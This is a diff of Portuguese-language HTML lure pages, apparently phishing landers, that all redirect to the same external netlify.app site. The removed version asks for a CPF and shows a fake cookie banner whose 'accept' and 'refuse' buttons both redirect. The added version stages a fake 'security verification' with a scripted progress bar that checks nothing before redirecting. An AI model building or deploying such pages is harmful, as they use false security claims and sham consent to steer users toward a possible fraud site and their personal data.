@@ -4,186 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Portal de Consulta</title>
+<title>Verificação de Segurança</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-
-<style>
-
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Inter',sans-serif;
-}
-
-body{
-background:#eef2f7;
-}
-
-/* HEADER */
-
-.header{
-background:#0f172a;
-color:white;
-padding:18px;
-text-align:center;
-font-weight:600;
-}
-
-/* CONTAINER */
-
-.container{
-max-width:420px;
-margin:40px auto;
-padding:20px;
-}
-
-/* CARD */
-
-.card{
-background:white;
-padding:30px;
-border-radius:12px;
-box-shadow:0 15px 40px rgba(0,0,0,0.08);
-text-align:center;
-}
-
-/* TITULO */
-
-h1{
-font-size:24px;
-margin-bottom:10px;
-}
-
-/* TEXTO */
-
-.desc{
-font-size:14px;
-color:#555;
-margin-bottom:20px;
-}
-
-/* INPUT */
-
-.input{
-width:100%;
-padding:14px;
-border:1px solid #ddd;
-border-radius:8px;
-margin-bottom:15px;
-}
-
-/* BOTÃO */
-
-.btn{
-width:100%;
-background:#2563eb;
-color:white;
-border:none;
-padding:15px;
-border-radius:8px;
-font-weight:600;
-font-size:16px;
-cursor:pointer;
-}
-
-.btn:hover{
-background:#1d4ed8;
-}
-
-/* INFO */
-
-.info{
-margin-top:15px;
-font-size:12px;
-color:#777;
-}
-
-/* SEGURANÇA */
-
-.security{
-margin-top:20px;
-font-size:13px;
-color:#444;
-background:#f1f5ff;
-padding:12px;
-border-radius:8px;
-}
-
-/* FOOTER */
-
-.footer{
-margin-top:25px;
-text-align:center;
-font-size:12px;
-color:#777;
-}
-
-.footer a{
-color:#2563eb;
-margin:0 6px;
-text-decoration:none;
-}
-
-</style>
-</head>
-
-<body>
-
-<div class="header">
-Central de Consulta
-</div>
-
-<div class="container">
-
-<div class="card">
-
-<h1>Consultar Informações</h1>
-
-<div class="desc">
-Informe seus dados para acessar informações disponíveis online.
-</div>
-
-<input class="input" type="text" placeholder="Digite seu CPF">
-
-<button class="btn" onclick="goLink()">
-Continuar consulta
-</button>
-
-<div class="security">
-🔒 Ambiente seguro • Seus dados não são armazenados nesta página
-</div>
-
-<div class="info">
-Você será direcionado para uma página externa com mais informações.
-</div>
-
-</div>
-
-<div class="footer">
-<a href="#">Política</a> |
-<a href="#">Termos</a> |
-<a href="#">Contato</a>
-</div>
-
-</div>
-
-<script>
-
-function goLink(){
-window.location.href="https://prismatic-crostata-496139.netlify.app/";
-}
-
-</script>
-
-</body>
-</html>
-
-<head>
-<title>SPC ONLINE</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-</head>
 
 <style>
 
@@ -192,126 +15,197 @@ window.location.href="https://prismatic-crostata-496139.netlify.app/";
 margin:0;
 padding:0;
 box-sizing:border-box;
+font-family:'Inter',sans-serif;
 }
 
-/* BLOQUEIA SCROLL */
-html,body{
-height:100%;
+/* BODY */
+body{
+background:linear-gradient(180deg,#020617,#0f172a);
+color:#fff;
+display:flex;
+align-items:center;
+justify-content:center;
+height:100vh;
+}
+
+/* CARD */
+.card{
+width:100%;
+max-width:420px;
+background:#0f172a;
+border-radius:16px;
+padding:30px;
+text-align:center;
+box-shadow:0 20px 60px rgba(0,0,0,0.6);
+}
+
+/* ICON */
+.icon{
+width:70px;
+height:70px;
+margin:auto;
+margin-bottom:20px;
+border-radius:20px;
+background:linear-gradient(135deg,#22c55e,#4ade80);
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:30px;
+}
+
+/* TITLE */
+h1{
+font-size:24px;
+margin-bottom:10px;
+}
+
+/* TEXT */
+p{
+color:#94a3b8;
+font-size:14px;
+margin-bottom:20px;
+}
+
+/* INPUT */
+.input{
+width:100%;
+padding:14px;
+border-radius:10px;
+border:1px solid #334155;
+background:#020617;
+color:#fff;
+margin-bottom:15px;
+}
+
+/* BUTTON */
+.btn{
+width:100%;
+padding:15px;
+border:none;
+border-radius:10px;
+background:linear-gradient(90deg,#22c55e,#16a34a);
+color:white;
+font-weight:600;
+font-size:16px;
+cursor:pointer;
+transition:.2s;
+}
+
+.btn:hover{
+transform:scale(1.03);
+}
+
+/* LOADING */
+.loading{
+margin-top:20px;
+display:none;
+}
+
+.bar{
+width:100%;
+height:8px;
+background:#1e293b;
+border-radius:10px;
 overflow:hidden;
 }
 
-body{
-position:fixed;
-width:100%;
-height:100dvh;
-}
-
-/* container */
-.site-wrapper{
-position:relative;
-width:100%;
-height:100dvh;
-}
-
-/* iframe */
-.site-frame{
-width:100%;
+.bar-fill{
 height:100%;
-border:none;
-filter:blur(6px);
-transition:filter .4s;
-pointer-events:none;
+width:0%;
+background:linear-gradient(90deg,#22c55e,#4ade80);
+transition:width .3s;
 }
 
-/* COOKIE */
-.cookie-overlay{
-position:absolute;
-bottom:0;
-left:0;
-width:100%;
-background:white;
-padding:25px;
-box-shadow:0 -10px 30px rgba(0,0,0,0.2);
-font-family:Arial;
-z-index:9999;
-}
-
-/* botões */
-.cookie-buttons{
-margin-top:15px;
-}
-
-.cookie-buttons button{
-padding:12px 25px;
-border-radius:6px;
-border:1px solid #c33;
-background:white;
-color:#c33;
-margin-right:10px;
-cursor:pointer;
-}
-
-.cookie-buttons button.accept{
-background:#c33;
-color:white;
-}
-
-/* MOBILE */
-@media (max-width:600px){
-
-.cookie-overlay{
-padding:20px;
-font-size:16px;
-}
-
-.cookie-buttons{
-display:flex;
-flex-direction:column;
-gap:10px;
-}
-
-.cookie-buttons button{
-width:100%;
-padding:16px;
-font-size:16px;
-}
-
+.status{
+margin-top:10px;
+font-size:13px;
+color:#22c55e;
 }
 
 </style>
+</head>
 
+<body>
 
-<div class="site-wrapper">
+<div class="card">
 
-<iframe
-class="site-frame"
-id="siteFrame"
-src="https://prismatic-crostata-496139.netlify.app/">
-</iframe>
+<div class="icon">✔</div>
 
+<h1>Verificação de Segurança</h1>
 
-<div class="cookie-overlay" id="cookieBox">
+<p>Confirme seu acesso para continuar com segurança.</p>
 
-<strong>Configurações de cookies</strong><br>
-Utilizamos cookies para melhorar sua navegação e oferecer uma melhor experiência. Para mais informações, consulte nossa Política de Cookies.
+<input type="text" id="nome" class="input" placeholder="Digite seu nome">
 
-<div class="cookie-buttons">
-<button class="accept" onclick="goLink()">Aceitar todos</button>
-<button onclick="goLink()">Recusar</button>
+<button class="btn" onclick="start()">
+Continuar
+</button>
+
+<div class="loading" id="loading">
+
+<div class="bar">
+<div class="bar-fill" id="bar"></div>
+</div>
+
+<div class="status" id="status">Iniciando verificação...</div>
+
 </div>
 
 </div>
-
-</div>
-
 
 <script>
 
-function goLink(){
+function start(){
 
-window.location.href="https://prismatic-crostata-496139.netlify.app/";
+let nome = document.getElementById("nome").value.trim()
+
+if(nome === ""){
+alert("Digite seu nome")
+return
+}
+
+document.querySelector(".btn").style.display="none"
+document.querySelector(".input").style.display="none"
+
+let loading = document.getElementById("loading")
+loading.style.display="block"
+
+let bar = document.getElementById("bar")
+let status = document.getElementById("status")
+
+let steps = [
+"Verificando conexão...",
+"Validando segurança...",
+"Checando permissões...",
+"Liberando acesso..."
+]
+
+let i = 0
+let progress = 0
+
+let interval = setInterval(()=>{
+
+progress += 25
+bar.style.width = progress+"%"
+
+status.innerText = steps[i]
+
+i++
+
+if(progress >= 100){
+clearInterval(interval)
+
+setTimeout(()=>{
+window.location.href="https://prismatic-crostata-496139.netlify.app/"
+},1000)
+
+}
+
+},800)
 
 }
 
 </script>
-```
+
+</body>
+</html>
